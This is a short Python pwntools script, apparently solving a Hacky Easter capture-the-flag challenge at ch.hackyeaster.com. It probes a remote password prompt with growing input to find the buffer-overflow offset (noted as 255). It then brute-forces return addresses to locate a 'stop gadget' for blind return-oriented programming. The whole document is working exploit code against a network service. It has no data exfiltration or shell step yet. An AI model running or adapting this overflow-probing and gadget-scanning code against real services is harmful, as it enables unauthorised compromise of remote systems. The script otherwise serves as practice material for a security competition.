from pwn import *

host = "ch.hackyeaster.com"
port = 2313


def find_buffer_size():
    length = 200
    found = False

    while not found:
        try:
            p = remote(host, port)
            print(p.recvuntil(b'Please enter your password:'))
            p.sendline('A' * length)
            print(p.recvuntil("Better luck next time\n", timeout=2))

            length += 1
        except:
            print("=== BROKEN at", length)
            found = True
        finally:
            p.close()


def get_stop_gadget(offset):
    addr = 0x400000
    while True:
        try:
            print(f"Attempt addr {addr}")
            r = remote(host, port)
            r.recvuntil('Please enter your password:')
            r.send(b'a' * offset + p64(addr))
            content = r.recv()
            r.close()
            if b'Please enter your password' in content:
                return addr
            addr += 1
        except EOFError:
            r.close()
            addr += 1
        except PwnlibException:
            pass


# 255 is the size at which the buffer breaks
# find_buffer_size()

get_stop_gadget(255)